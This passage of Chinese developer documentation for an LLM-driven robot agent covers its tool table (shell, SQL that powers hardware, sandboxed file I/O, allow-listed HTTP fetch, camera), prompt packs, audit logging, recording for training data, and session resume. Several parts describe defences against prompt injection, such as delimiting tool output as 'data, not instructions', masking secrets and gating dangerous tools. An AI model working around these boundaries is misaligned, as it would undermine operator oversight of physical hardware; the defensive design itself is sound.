| `wait_variable` | **等一个读数满足条件**（`name`/`key`/`condition`=`gt`/`ge`/`lt`/`le`/`eq`/`ne`/`changed`/`value`/`timeout_sec`/`poll_ms`）：后端按 `poll_ms` 轮询该变量，直到条件成立或超时，一次调用给一个结论——模型不必用多轮 `read_variables` 手工轮询 | 与 `read_variables` **同一门控与副作用面**（`--read-var` 清单、`playQuiet`）。**超时是结果不是失败**（`ok=true`，回执写明超时与最后读数）；`timeout_sec` 缺省 30、上限 = `action_script_timeout_sec`（等待期间后端主线程被占，与 `run_action_script` 同）；每 ≤100 ms 看一次停止标志，Ctrl-C 不会坐满超时；键首采样缺失不判错（daemon 出首帧前没有 `v0`），超时回执列出样本现有键；键在而非数值撞上 `gt/ge/lt/le` 首采样即报参数错。结论在「数据不是指令」定界之外、读数在定界之内；`summary` 给审计 `satisfied=… elapsed_ms=… samples=…` |
| `query_sql` | 结构 SQL 只读查询/语法校验：`SELECT * FROM 表名;` 返回该表列与行，可带等值条件 `WHERE 列 = 值 [AND 列2 = 值2 ...]`（精确文本匹配，与渲染同源）；`SHOW TABLES;` 列出当前结构全部表名与数据行数（含宿主**自动注入**的 `Camera` 表——结构脚本摘录里看不到它）；`CREATE`/`INSERT` 只做解析回显 | 只读、无副作用（不装配硬件、不改结构矩阵）；仅支持星号全列与等值条件（AND 连接，无 OR）、语句以 `;` 结尾；结果经「数据非指令」定界回传。**不含 `DELETE`/`DROP`**——那是带电变更、会真的断电摘器件（`DROP` 更是撤整表），请走 `apply_sql`（可先用本工具确认 WHERE 会命中哪些行） |
| `apply_sql` | 结构 SQL **带电生效**：`CREATE TABLE` 建新表（装配驱动模块、真机上电、注册变量）、`INSERT INTO` 往既有表追加行、**`DELETE FROM ... [WHERE ...]` 当场逆序断电并摘除匹配行**（无条件写法删全表）、**`DROP TABLE ...` 当场撤下整张表**（行 + 表壳；**不带 `WHERE`**——它是 DDL、作用于整张表）、**`UPDATE ... SET ... [WHERE ...]` 按断电重建改写命中行**（先摘旧件再装新件；无条件写法改全表数据行；与该表其它行级语句不得同批，拆两次调用即可）；同批次的 `Action` 行执行一次即丢弃（瞬态，不注册） | **缺省不注册**，须命令行 `--agent-hot-sql` 显式开启（配置文件的 `allow_hot_sql` 只能关不能开）；表名/列名须为安全标识符、驱动模块须已在模块路径下、`@Daemon` 行的 `chunk` 须为相对路径；校验全部只读，**任一步失败整批回滚**（逆序断电 + 注册表回退），但已下发的物理动作不回退。**`DELETE`/`DROP` 是不可逆的物理断电，没有回滚**：全部校验（含引用完整性）在动第一个器件之前跑完，中途物理失败则如实报「已删 N 个（名单）、M 个未删」；被 `controller`/`trigger`/`$`/`$(...)` 引用着的变量拒绝删除/改写并点名引用方。**`UPDATE` 批次是先删后建**：新件装配失败时已摘旧件不复原，错误点名丢失的变量（按需要的值重新 INSERT 即可恢复）。对照/查询请用 `query_sql` |
| `capture_image` | **拍一张照片并把画面注入上下文**，多模态模型因而能「看见」环境 | 经 `modules/Camera.lua` 取帧（V4L2 + MJPEG）；`--no-camera` 可关闭；图片走独立通道（见下节）。可请求采集尺寸：`width`/`height`（像素 16..8192，须同时给出，缺省 640x480）——换尺寸重开设备、代价高于同尺寸连拍；设备就近调档时回执报**实际**尺寸；仿真来源不缩放、请求尺寸无效并明说 |
| `run_command` | 在主机上执行 shell 命令（退出码 + stdout + stderr） | 超时（缺省 10s，上限 60s，超时整进程组 SIGKILL）、单流 64KB 截断、环境变量清洗、继承 fd 全部 CLOEXEC、**回执进模型上下文前遮蔽敏感值**（G1）；**缺省不注册**，须命令行 `--agent-shell` 显式开启（配置文件的 `allow_shell` 只能关不能开，写 `true` 会拒绝加载） |
| `list_dir` | 列出机器人主机上一个目录下的条目（文件名 + 类型 + 大小；只读、不递归；`path` 缺省为只读根目录本身） | 符号链接条目不列；条目数上限 1000（超限截断并标注）；**缺省不注册**，须命令行 `--fs-root <目录>` 显式开启（配置文件的 `fs_root` 一律拒绝加载，见安全说明第 13 条） |
| `read_file` | 读取机器人主机上一个文本文件的全部内容（只读） | 路径必须落在 `--fs-root` 根目录之下（`agent_sandbox.hpp` 的 `resolveUnderRoot`：词法 + canonical 根包含性，符号链接逃逸一律拒绝）；大小上限 64 KiB（超限响亮拒绝，不截断）；二进制（含 NUL 或非法 UTF-8）拒绝返回；回执经 `maskSecretsInText` 遮蔽敏感值（与 `run_command` 同单点）；**缺省不注册**，须命令行 `--fs-root <目录>` 显式开启（与 `list_dir` 同门控，配置文件不能开） |
| `write_file` | 在机器人主机上创建或覆盖一个文本文件（原子写入：先写同目录临时文件再落地，不留半截内容） | 路径同 `read_file` 的沙箱判据；目标是符号链接一律拒绝（无论 `overwrite`）；目标已存在时**默认拒绝覆盖**，须显式 `overwrite:true`（覆盖不可逆）；大小上限 64 KiB、不接受含 NUL 的内容；父目录须已存在（不自动创建）；落地文件权限 **0600**（别的用户/进程读不到，需跨用户共享时不适用）。落地按 `overwrite` 分两路：新建 `link`（目标已被抢先创建则 `EEXIST` 拒绝，堵 TOCTOU 静默覆盖）、覆盖 `rename`（原子替换），详见安全说明第 14 条。**缺省不注册**，须命令行 `--agent-write-file` 显式开启且依赖 `--fs-root`（配置文件的 `allow_write_file` 只能关不能开）；危险性与 `run_command`/`apply_sql` 同级，`--mcp-backend` 下**强制**要求 policy 且 `require_confirm` 包含 `write_file` |
| `http_fetch` | 对允许清单内的主机发起一次 HTTP GET，返回状态码与响应体（**Rust 本地工具**：在 `mybot-agent` 进程里执行，不经后端） | **缺省不注册**，须 `mybot-agent` 命令行 `--allow-host <主机[:端口]>`（可重复）显式开启——**精确匹配**、无通配/后缀匹配，不写端口的条目只放行 http/https 缺省端口；配置文件没有对应字段（写了按未知字段拒绝整份配置）。只发 GET、**不跟随重定向**（3xx 回执报出 Location，由模型另发一次仍受白名单约束的调用）、**不走系统代理**、url 不得带用户名/密码；只收文本类 Content-Type（`text/*`、JSON、XML），响应体上限缺省 64 KiB（`--http-fetch-max-bytes`，边读边数、超限中止），须为 UTF-8；超时缺省 10 秒（`--http-fetch-timeout`）。回执逐行 `> ` 按「数据不是指令」定界，定界前按与 `maskSecretsInText` 同一套名字与值边界遮蔽敏感值（Rust 侧 `mask_secrets`，不经 C++）。非 2xx 照样带响应体、但判失败。审计 `kind=tool` 行由 agent 侧落（url 去 query）。不强制策略确认（只读、无副作用，理由与风险见安全说明第 15 条） |

`run_action_script` 执行失败（脚本名错、硬件未接、解析错误）不会中断会话：报错文本作为工具结果回传模型，由模型决定换个做法还是如实汇报。

## 摄像头：capture_image

摄像头也是一颗 Lua 驱动（`modules/Camera.lua`）：V4L2 mmap 取帧、直接拿摄像头硬件编码好的
**MJPEG**，因此宿主不必链接任何采集/编码库（robot_agent 的 C++ 版为此需要 libjpeg）。
未声明时后端会按 `--camera-var` 自动注入 Camera；不再自动注入 LLM 驱动。
以下两组任选其一，Rust 侧需先配置支持图片输入的模型、endpoint 与密钥。

```bash
# 终端 1：无摄像头也能跑通全链路，用已有图片当"摄像头"
./build/mybot --robot=robots/relay-test.sql --mcp-backend \
  --mcp-socket /tmp/mybot.sock --camera-src /tmp/pic.jpg
# 终端 2：任务交给 Rust agent
./agent/target/release/mybot-agent --socket /tmp/mybot.sock \
  --task "拍张照片看看周围有什么"
```

```bash
# 终端 1：真实摄像头（缺省 /dev/video0；会给机器人硬件上电）
./build/mybot --robot=robots/spider1.sql --mcp-backend --mcp-socket /tmp/mybot.sock
# 终端 2：任务交给 Rust agent
./agent/target/release/mybot-agent --socket /tmp/mybot.sock \
  --task "看看前方有没有障碍物"
```

### 图片怎么进上下文

OpenAI 协议的 **tool 消息只允许文本**，所以图片不能塞进工具结果里。Rust 的
`agent/src/model.rs`（`BudgetModel::inject_images` / `apply_injections`）将后端返回的
图片加入对应的 rig 工具结果消息末尾，顺序为工具结果、说明文本、图片。
rig provider 转换为 OpenAI 报文时，先输出本轮全部 `tool` 消息，**再**输出带图的 `user` 消息：

```jsonc
// OpenAI 线上形态：位于本轮所有 tool 消息之后。
{ "role": "user", "content": [
    { "type": "text", "text": "以上工具返回的图片如下，请结合画面内容继续。" },
    { "type": "image_url", "image_url": { "url": "data:image/jpeg;base64,..." } } ] }
```

消息组装与 provider 映射现由 Rust/rig 负责，不再调用 C++ `messageToJson`。
注入顺序及跨轮位置由 `agent/src/model.rs` 中的图片注入单测约束。

> **沿革（B3，2026-09-22 → 2026-09-26 移除）**：旧 C++/Lua 路径曾用 `{"__bot_img": N}`
> 游标，经 `MtVars_Lua::setHostImages` / `__bot_img(N)` 在组包时落值。agent 循环迁 Rust
> 后宿主不再组装模型请求，该通道已无生产调用者，故连同 `setHostImages`/`__bot_img`
> 一并从 luavar 删除；现役图片通道是 capture_image 工具直接把 base64 交给 Rust agent。

图片由 Rust REPL 在任务结束时物化到会话历史里，后续任务仍然看得到它。

data URL 的 MIME 取自**驱动返回的 `format` 字段**（`image/jpeg`、`image/png`、
`image/gif`、`image/webp`）：驱动按**魔数**判定格式，宿主只做一次「声明与内容
是否自洽」的交叉校验，不符即拒绝发出（否则会把错标签发给网关，那边只会回一个
含混的「图片解析错误」）。所以第三方摄像头驱动必须**如实返回 `format`**，
且只支持这四种；仿真来源（`--camera-src`）不是这四种时驱动会在 `build` 阶段
就以 `unsupported sim image format` 拒绝。

> **需要多模态模型**。`capture_image` 只负责把画面送到；模型能不能看图取决于你选的
> 模型/接入点。DeepSeek 的 `deepseek-chat` 不吃图片输入——它可能忽略图片或直接报错，
> 换一个支持视觉的模型即可（本项目对协议不做假设，两个内置驱动都如实转发图片）。

### 设计要点

- **摄像头是可选外设**：**真机路径下**驱动 `build` 不打开设备、也不返回 ERR，否则一台
  没接摄像头的机器人会连电都上不了。设备在第一次拍照时按调用参数惰性打开，打不开就如实
  报给智能体（「无法打开摄像头 /dev/video0（errno=2）…」），模型据此自己决定改做什么。
  例外：显式给了仿真来源（结构脚本里声明 `src` 元数据列，或 `--camera-src`）时，
  路径越界 / 文件缺失 / 格式不受支持会**刻意在 `build` 阶段返回 ERR**——拒绝一次注定
  失败的仿真，比上电后再报错更早、更清楚。agent 模式的自动注入路径不受影响（宿主只在
  调用时才传 `src`）。
- **热插拔**：抓拍失败即释放设备，下次调用重试打开；换设备也靠同一句重开。
- **采集尺寸可请求（2026-09-25 #6）**：`capture_image` 的 `width`/`height`（16..8192，须同给同缺）
  透传给驱动；与上次请求不同就重开设备重新 `VIDIOC_S_FMT` 协商（起流后不可改格式）。
  驱动按**请求值**判「是否要重开」而非按协商值——设备常就近调档（请求 300x200 得 320x240），
  按协商值比对会每次调用都重开。回执报**实际**尺寸；请求与实际不符时说明「被设备就近调档」。
  仿真来源（`--camera-src`）不缩放图片，此时请求尺寸无效并在回执里明说。尺寸界值只在宿主
  单点维护（`agentimage.cpp`），Lua 驱动只校验「同给同缺 + 正整数」。
- **首帧丢弃**：起流后的第一帧曝光/白平衡常常未稳，丢弃后再取一帧（与 robot_agent 同做法）。
- **截断帧重取**：UVC 设备可能吐出熵编码中途截断的 MJPEG 帧（2026-09-19 实测某设备约半数帧如此；
  内核不置 `V4L2_BUF_FLAG_ERROR`，宽松解码器照样出图），模型网关的严格解析器却会直接 400
  「图片输入格式/解析错误」。取帧后按「帧尾 EOI」校验（`lib/mjpeg_frame.lua`；只在帧尾窗口搜索，
  防 APP1 内嵌缩略图的 EOI 误判），不完整整帧丢弃重取（上限 8 帧），不让坏帧流进模型上下文。
- **仿真**：`--camera-src <图片>` 直接读文件并 base64 返回，与真机走同一段返回逻辑，
  因此「拍照 → 进上下文 → 模型看图」这条链路在没有摄像头的开发机上也能完整回归。
- **路径白名单**：驱动读文件/开设备都受白名单约束——设备只放行 `/dev/videoN`；
  仿真图片只放行 `--camera-src` 所在目录（或环境变量 `BOT4CJ_CAMERA_SRC_DIR` 列出的
  目录，冒号分隔）**之内**的文件，判定走 `realpath`，符号链接展开后仍越界即拒。
  两者都没给时仿真模式默认禁用。这样 `src`/`path` 就不再是「读任意路径」的原语。
- **ABI 自检**：V4L2 结构尺寸与 ioctl 编号既在驱动加载期 `assert`，又在构建期由
  `test/test_v4l2_consts.c` 与 `<linux/videodev2.h>` 比对（F-24 同族）——ffi 声明比内核
  小几字节就是越界读写，必须让它在构建期就失败。

## 提示词包：绑定机器人身份

内置系统提示词只讲机器人本体（结构、硬件清单、脚本清单、工作方式）；「这个机器人
**是谁**、该怎么行事」由提示词包定义，移植自 robot_agent 的 `--prompt-file` 能力：

```bash
# 终端 1：工具后端，提示词参数不放在这里
./build/mybot --robot=robots/spider1.sql --mcp-backend --mcp-socket /tmp/mybot.sock

# 终端 2：目录内全部 .md 按文件名自然排序（编号即装载顺序）
./agent/target/release/mybot-agent --socket /tmp/mybot.sock \
  --prompt-file prompts/spider_robot/

# 或在终端 2 退出上一次 agent 后重启：可重复，显式文件保持传入顺序
./agent/target/release/mybot-agent --socket /tmp/mybot.sock \
  --prompt-file prompts/spider_robot/ --prompt-file my-extra-rules.md
```

- **拼接规则**：每个文件去首尾空白后为空则跳过；只有一份时保持原文不加标题；
  多份之间以空行分隔、每份前加 `## 文件名` 分节。整包**追加在系统提示词内置段落
  之后**，用户输入仍只是 user 消息——markdown 定义「这个机器人怎么做事」，
  任务文本定义「现在做什么」。
- **配置文件等价写法**：`"prompt_files": ["prompts/spider_robot"]`（字符串数组，
  每项为文件或目录）。命令行给过 `--prompt-file` 就整体覆盖配置文件列表，
  与其他选项的「命令行 > 配置文件」口径一致。
- **配置文件来源的路径有根约束**（H2，2026-09-23）：`prompt_files` 里的每一项
  必须落在**当前工作目录**或环境变量 `BOT4CJ_PROMPT_DIR`（冒号分隔）列出的目录
  之内，越界在配置组装期报错退出 2（点名条目、允许的根与两个出路）。命令行
  `--prompt-file` 不受此约束——它是操作者本人的授意；配置文件则不是（理由是
  安全说明第 11 条）。上面那条相对路径写法（`prompts/spider_robot`）天然在
  CWD 之内，因此照旧可用。
- **加载时机**：Rust `agent/src/startup.rs::load_prompt_pack` 调用 `prompt.rs`，在连接
  后端之前加载；路径写错、目录里没有 `.md` 等错误退出 2。后端独立运行，可能已上电，
  不能把 Rust 配置失败理解成后端未上电或自动断电。单文件 1 MiB 上限，超限响亮拒绝。
- **示例包**：`prompts/spider_robot/` 定义蜘蛛机器人的身份、摄像头能力与动作脚本用法、
  动作脚本语义表、行为纪律（前方有障碍不得前进），展示「大模型大脑 + 脚本驱动
  硬件」的完整绑定链路。提示词包是纯 Markdown，照着这个目录结构写你自己的即可。

## 审计轨迹：--audit-log

`--audit-log <路径>`（或配置文件 `audit_log` 字段；`-` 表示写 stderr）以 **JSON Lines**
追加记录——部署形态为「机器人跑在现场」时，出事后「模型到底做了什么」靠它复盘。
每行都有 `ts` / `session` / `kind`，`kind` 决定其余字段（**加法演进**：工具行的
字段名与语义从未变过，新记录类型只是加了新的 `kind`）：

```jsonc
// kind=tool：一次工具调用（既有形态，字段未变）
{"ts":"2026-09-22T17:04:11.238+08:00","session":"1a2b3c4d","kind":"tool","turn":2,
 "tool":"run_command","args":{"command":"ls -l /dev/video0","timeout_seconds":10},
 "ok":true,"ms":43,"bytes":812,"exit_code":0}
// kind=model：一轮模型调用（SAN-9）——回答"模型说了什么、花了多久、有没有重试"
{"ts":"2026-09-22T17:04:12.001+08:00","session":"1a2b3c4d","kind":"model","turn":2,
 "ok":true,"status":"ok","ms":812,"req_bytes":24616,"resp_bytes":82,"attempts":1,
 "prompt_tokens":1234,"completion_tokens":56}
// kind=session：会话头尾（SAN-9）——回答"这次会话是用什么配置跑的、怎么结束的"
{"ts":"2026-09-22T17:04:10.500+08:00","session":"1a2b3c4d","kind":"session",
 "status":"start","driver":"LlmOpenAI","model":"m0",
 "endpoint":"https://gateway.example/v1/chat/completions","api_key_source":"env"}
```

- **三类记录**：`tool`（每次工具调用）/ `model`（每轮模型调用，**失败也记**——
  那是复盘"这一轮为什么没跑起来"的唯一线索；历史摘要请求也是一行 `model`，
  `status=summary` / `summary_error`，不带 `turn`）/ `session`（`start` / `end` / `error`）。
  没有 `model` 与 `session` 时，一次在模型调用阶段失败的会话在日志里会**一条都没有**。
- **token 只记 provider 给的数**：`usage` 由驱动原样透传，宿主只挑
  `prompt_tokens` / `completion_tokens` 记账，**不推算、不计费**；provider 没给就没有这两个键。
- **接入点脱敏**：`endpoint` 落盘前剥掉 **query 与 userinfo**（有些网关把凭据放在
  URL 里，而审计是 append-only 的落盘文件）。`api_key_source` 只记来源枚举名
  （`env` / `config_inline` / `config_file`），**值绝不出现**。

- **位置在宿主派发漏斗**（`src/agentdispatch.cpp` 的 `DispatchGate::run`）：后端帧协议与 `.mt` 脚本都绕不过；参数解析失败、未知工具、工具异常同样各记一条（「模型想做什么但没做成」也是审计信息）。
- **图片不进日志**：`capture_image` 只记 `image_bytes` 与 16 位指纹（`image_fp`，FNV-1a 64，非密码学摘要）——否则每次拍照数百 KB 灌进磁盘，且画面可能含隐私。
- **密钥遮蔽**：`run_command` 的命令原文记进 `args.command` 前先遮蔽敏感值——`KEY=VALUE`、`Authorization: Bearer <tok>`、裸 `Bearer <tok>`、JSON 引号键 `"name": value`（2026-10-08 补，见下）四种形态的值替换为 `***`；判据与 `run_command` 的环境清洗同源（整词切词，`KEYSTONE`/`MONKEY` 不误伤）。**同一个 `maskSecretsInText` 单点也用于回执**（G1）：命令自己打印到 stdout/stderr 的敏感值，在回传模型前同样被遮蔽；`list_dir`/`read_file`（第 13 条）的文件内容回执同样经这个单点（2026-10-08 补，此前只有 `run_command` 接了，是审计 P1 发现的缺口）。
- **谁落工具行**：后端工具的 `kind=tool` 行由后端（`mybot --mcp-backend --audit-log`）在派发漏斗里落；
  不经后端的 Rust 本地工具 `http_fetch` 后端看不见，其 `kind=tool` 行由 `mybot-agent` 的 `--audit-log`
  落，字段同名同义（`turn`/`tool`/`args`/`ok`/`error`/`ms`/`bytes`/`summary`；`args.url` 去掉查询串、
  片段与 userinfo，`summary` 为 `status=<HTTP 状态码>`）。两侧共用同一个审计文件时，同一会话的工具行
  就按时间交错在一起。（`ica_*` 是纯内存账本、无外部副作用，不落工具行。）
- **生效摘要（G2）**：`apply_sql` 等工具行的 `summary` 字段记工具自报的结构化生效信息（新增几张表/几个变量/几行……），供复盘对账「这次热插到底改了什么」；只做加法，不带 `summary` 的老工具行不出现该键。
- **失败响亮**：日志流写入失败（磁盘满等）向 stderr 告警一次，不打断机器人动作；路径打不开则**上电前**报错退出 2（「配置错误不碰真机」）。
- 默认**关闭**（不传 = 不写任何东西）；开启即 append-only，不做轮转（交给外部工具收集）。会话开始时把实际落点打印到 stderr。
- 审计是**记录**不是防线：它不审批、不拦截；配合 `--agent-shell` 使用时请把它当「事后追责」证据，而非「事前阻止」闸门。

## 录制模式与训练集导出：--record

> **定位（2026-10-09）**：审计轨迹记「计时与次数」，会话文件记「可恢复的历史文本」
> （图片刻意不落盘，见上文），录制是**第三条通道**——把每段会话的**完整详细上下文**
> （含图片本体）留档。主要用途是**微调小模型的训练数据采集**（`scripts/record_export.py`
> 导出），顺带供事后复盘「模型当时实际看到了什么（含照片）、说了什么」。缺省关闭；
> 会话文件 v1 行格式与审计语义**都不改**（录制是独立旁路，不是它们的扩展）。

`mybot-agent` 的三个选项**只有命令行入口**（配置文件没有对应字段，写了按未知字段
拒绝整份配置）：录制把完整上下文与图片写到磁盘，敏感面比会话文件更大，只认操作者
亲手给的命令行——与 `--allow-host` 同判据。

- `--record`：开启录制，段落落在 `$MYBOT_HOME/robots/<机器人>/recordings/`
  （`$MYBOT_HOME` 缺省 `$HOME/.mybot`；无状态目录时上电前报错退出 2）。
- `--record-dir <目录>`：显式录制根（与 `--record` 互斥；不依赖状态目录）。
- `--record-max-bytes <n>`：图片仓总量上限（0..68719476736，缺省 0 = **不限**——采集
  跑批的磁盘由人盯着，上限留给「机器人现场顺手开录制」的部署手动设置；超限**响亮
  降级**为仅元数据，文本事件不受限）。

**布局**（一个录制段 = 一个目录，append-only 不轮转；目录 0700、文件 0600，
与会话文件同规）：

```text
<录制根>/latest                     指针（0600）：当前段目录名，续接时链回前段
<录制根>/<UTC 段名>/                段目录（O_EXCL 占位，同名退 -<pid>）
    meta.json                       会话元信息（模型/脱敏接入点/工具 schema 快照/
                                     各指纹/会话文件路径），写一次
    system.txt                      系统提示词全文（重放需要；会话文件刻意不落它）
    events.jsonl                    事件流（0600，逐行 flush，追加写）
    images/<序号>-<指纹>.<ext>       图片本体（base64 解码后的二进制，指纹去重）
```

**事件流**：每行 `{ts, seq, event, …}`，`event` 决定其余字段。消息按**增量**记录
（水位之后的新消息才落，`R20` 守门）：`task_begin` → `model_call`（口径同审计
model 行：turn 0-based、attempts、token 只记 provider 给的数；摘要轮不带 turn）→
`msg`（本轮新消息，含 tool_calls/回执全文/图片引用）→ `task_end{ok}`。
`history_evict`/`history_summary`/`clear`/`resume` 维持水位一致性——**任意轮次
的有效上下文可由事件重放重建**（被裁块换成挂在系统提示词末尾的摘要节），不需要
每轮整份快照。消息编码保持内容块次序：一条 user 消息可能是
`[tool_result, text(图片说明), image]`，正是图片注入后的线上形态；图片块只落引用
`{file, bytes, fp, mime}`，**base64 永不进 JSONL**。工具调用不单独记事件——参数在
assistant 消息的 tool_calls 里、回执全文在 tool_result 里，消息流本身就是训练数据
要的形态；计时与 exit_code 由审计轨迹承担（分工）。

**续接关联**：会话续接（默认续接/`--resume`）时**新开一个录制段**（不向旧段追加，
append-only 不可变），`meta.json` 的 `resumed_from` 链回前段；恢复进来的历史前缀
**不重复落事件**（由会话文件承载，meta 记了路径，导出器做联结）。

**失败语义**（对齐会话文件）：段建不起来 → 启动期退出 2（配置错误不碰真机）；
中途写失败 → stderr 告警一次并停用录制，对话照常（不静默丢，也不打断机器人）。

**密钥纪律**：`meta.json` 只记 `api_key_source` 枚举与脱敏接入点（复用审计的
`sanitize_endpoint`），**密钥值绝不出现**；工具回执按「进入上下文的原样」记录
（后端工具已过 `maskSecretsInText`，`http_fetch` 在定界前过 Rust 侧同一套形态的
`mask_secrets`——见已知限制）。

**训练集导出**：`scripts/record_export.py`（纯标准库 Python，与 mcp_e2e 的帧客户端
同规）：

```bash
# 先只读检视：时间线 + 每个任务的成败/轮数/图片数
python3 scripts/record_export.py --inspect <段目录或录制根>

# 缺省：任务块粒度、effective 上下文（模型当时实际看到的，含摘要节）、openai 方言
python3 scripts/record_export.py --out /tmp/ds <段目录>

# sharegpt 方言（Qwen <tool_call>/<tool_response> 约定 + LLaVA <image> 标记与图片复制）
python3 scripts/record_export.py --to sharegpt --keep-reasoning --out /tmp/ds <段目录>

# 整段轨迹：多个段按 resumed_from 链拼接成一条（system_fp 不同的段拒绝串）
python3 scripts/record_export.py --granularity session --to raw <录制根>
```

样本形如 `{task_meta:{ok,turns,prompt_tokens,…}, tools:[当时的 schema 快照],
messages:[system(+摘要节), 上下文前缀, 本任务全部新消息]}`；`--context full` 用
未裁剪的完整对话（会话文件联结）；`--filter ok|all`（缺省只导成功任务）、
`--split 0.95`（切 train/val）、`stats.json` 恒产（样本/轮数/token/图片去重率/按
工具的调用频次）。`openai` 方言把 user 消息的 tool_result parts 先出 tool 角色消息、
其余 parts 出 user 消息（与线上 provider 转换同序），图片内联 data URL（自包含）。

`/status` 有「录制」一行（落点与事件/图片计数）；`--check-config` 摘要有录制栏
（缺省布局只报根与模式，不臆造段名）。回归：`scripts/agent_e2e.sh` 的 R20/R20b/
R20c/R20d（段布局与权限、事件时序、图片本体与源图逐字节一致、三种方言导出回路、
续接链、超限降级、互斥负路径）+ `record.rs` 单测（水位/去重/降级/权限）。

## 会话持久化：--session-file / --resume

> **状态（2026-09-25，批次 D 已落地）**：`--session-file` / `--resume` 由 Rust
> `mybot-agent` 实现（`agent/src/session.rs`）。C++ 侧的读写原语参考实现
> （`src/agenthistory.{hpp,cpp}` / `test_sessionfile.cpp`）已随落地一并清退——
> 不再有 C++ 孪生，`agent/src/session.rs` 是唯一实现。行格式与 C++ 参考逐字节
> 兼容（JSON Lines，首行会话头），故 C++ 时代落下的会话文件仍可被 `--resume`
> 读回。C++ 宿主侧（`--mcp-backend`）对 `--session-file` / `--resume` 的既有
> 拒绝（这两个选项只在 agent 模式下有效，`--mcp-backend` 侧出现即退出 2）与
> 帮助文案不变——本机制完全在 `mybot-agent` 一侧。

**问题**：agent 的对话记忆此前只在进程内存里——重启即忘。而现场机器人重启的代价
不小（硬件要重新上电、动作位置丢失），一次巡检或陪伴类用法被一次重启清空上下文，
等于从头再来。本机制让「忘掉对话」不再只能靠重启。

**落盘（`--session-file <路径>`，或配置文件 `session_file` 字段）**

- 格式与审计同款：**JSON Lines 追加写**（第一行是会话头，其后一消息一行）。
- **写入时机 = 任务块完结**：最终回答入历史之后才落盘，因此**文件里每个前缀
  都是服务端可接受的历史**——失败/中断留下的半截 `tool_calls` 序列永不落盘
  （那种序列服务端会 400）。两条边界语义（都有用例钉住，别当成 bug 改）：
  **失败任务里已完成的那轮工具**会随后续成功任务一起落盘（与内存历史一致，
  口径同「硬件不会倒回去，抹掉等于说没发生」；失败任务的完整记录看审计轨迹）；
- **图片写入期排除**：图片字节（data URL）不落盘，落盘的是
  `[图片 N 字节，未随会话恢复]` 占位文本。体积与隐私两个方向都指向「不落盘」，
  只有写入期排除才真的做到（恢复期占位意味着磁盘上仍躺着 base64 画面）。
- **system 提示词不落盘**：恢复时由当前进程重建，再用会话头里的**系统提示词指纹**
  核对——提示词变了就该拒绝恢复，而不是把两份不同的提示词混在一起。
- 每行即刷（`fflush`）：崩溃最多丢最后一行。写失败向 stderr 告警一次并停用落盘，
  **不静默丢历史**。
- 权限：文件含完整对话内容，与 `mybot.llm.json` 同等敏感。启动时若发现权限宽于
  `600` 会告警（不阻止——重放历史时也读它）。

**恢复（`--resume`，与 `--session-file` 联用）**

- **路径必须来自命令行**：恢复是把磁盘内容读进模型上下文（输入通道），
  配置文件里的 `session_file` 只用于写入，不能授权一次读取——与 `camera_src_dir` /
  `read_vars` 同判据（配置文件只能收紧不能放宽）。文件必须已存在，否则退出 2。
- **三道判据，全过才恢复**（任一不过即拒绝并说明差异，退出 2）：
  1. **逐行解析**：损坏行**跳过并点名行号**（崩溃留下的残行不该抹掉此前的完整历史），
     首行不是合法会话头（或版本不认）则整份拒绝——没有头就无从核对指纹。
  2. **指纹核对**：结构脚本名 / 工具集指纹 / 系统提示词指纹三者一致。
     提示词包或脚本清单变了，旧上下文对不上号。

     **工具集指纹的取舍（2026-10-08 补留档）**：它是
     `fingerprint64(工具名按注册序逗号拼接)`（`agent/src/session.rs:66`），只哈希**名字**。
     三个推论，操作时都用得上：

     ① **加工具、删工具、改名、调整注册顺序，任一都会让此前所有会话文件的 `--resume`
     失败**（报「工具集不同（会话头的工具集指纹 X，当前 Y）；工具调用历史对当前会话
     不再适用」，退出 2）。工具扩展计划曾把这列为开工前必须决定的议题——「接受换新段」
     还是「设计只增不减的向后兼容指纹」——实际按**接受换新段**落地（`list_dir`/
     `read_file` 加进来断过一次，`write_file` 又断过一次；开/关 `http_fetch`（给不给 `--allow-host`）同理），但当时没写进任何被跟踪的
     文档，这里补上。理由：兼容指纹要么放过「工具集变了、可历史里还留着对已删工具的
     调用」这种服务端会 400 的序列（正是判据 3 要挡的东西），要么得逐条改写历史——
     两条都比让操作者重开一段会话贵得多。

     ② **改工具的描述文本不影响 `--resume`**（名字没变）。措辞校准可以放心做，不会断掉
     操作者的既有会话。

     ③ 这个公式**不能改**：C++ 侧的会话文件原语已随批次 D 清退（`d16b39f`），但行格式
     与指纹公式刻意保持逐字节兼容，好让 C++ 时代落下的会话文件仍能被现在的进程读回
     （见 `agent/src/session.rs:3-5` 模块头）。`session.rs` 里那些「与 C++ `xxx` 同式」
     的注释指的是这份**已删除的**参考实现，是兼容约束而非现存孪生。

  3. **协议自洽**：`tool_call_id` 无孤儿、无重复、无漏答（Rust 侧
     `session::protocol_violation`，与 C++ 参考的 `historyProtocolViolation`
     同判据同文案）——恢复的历史是磁盘上的可变内容，按**不可信输入**对待，
     服务端会 400 的序列宁可当场拒绝，也不要让此后每个任务都以同一个 400 失败。
- 恢复后仍受 `max_history_bytes` 预算约束（内存侧裁剪；文件是 append-only，
  不回写、不重排）；`/clear` 会向文件写 `session_clear` 分界标记，
  恢复时该标记丢弃此前的全部消息（连同历史摘要）——否则「忘掉对话」会在下次恢复时复活。
- 历史摘要随文件恢复：每次摘要成功写一行
  `{"type":"session_summary","content":"…","keep_blocks":K}`——`K` 是那一刻磁盘上摘要
  **没有**覆盖的最新任务块数。恢复时读到这行就把此前累积的消息收口成最后 `K` 个块并
  带回摘要正文，恢复后送给模型的历史与写入进程当时的一致，不多不少；就绪行报
  「已恢复会话：N 条历史消息，含历史摘要 M 字节」。摘要失败时什么都不写，下次恢复
  照旧按预算整块裁剪（自愈）。消息行本身不受影响：文件里仍是完整的逐条对话。
- 审计联动：沿用被恢复会话的原 `session id`（恢复前后的行能对上同一段对话），
  并在 `kind="session"` 的 `start` 记录上标 `"resumed": true`（**加法字段**：
  老消费方按既有字段过滤的行为逐字节不变）。

```bash
# 终端 1：工具后端（硬件上电常驻，与是否恢复会话无关）
./build/mybot --robot=robots/spider1.sql --mcp-backend --mcp-socket /tmp/mybot.sock

# 终端 2·第一次会话：落盘
./agent/target/release/mybot-agent --socket /tmp/mybot.sock \
  --session-file /var/lib/mybot/s.jsonl

# 退出 agent 后在终端 2 重启；终端 1 可保持运行，若后端已停则先重新启动
# 接着上次的上下文继续（路径必须命令行给；会话文件不恢复硬件物理状态）
./agent/target/release/mybot-agent --socket /tmp/mybot.sock \
  --session-file /var/lib/mybot/s.jsonl --resume
```

### 缺省落点与自动续接（`$MYBOT_HOME`，2026-10-03）

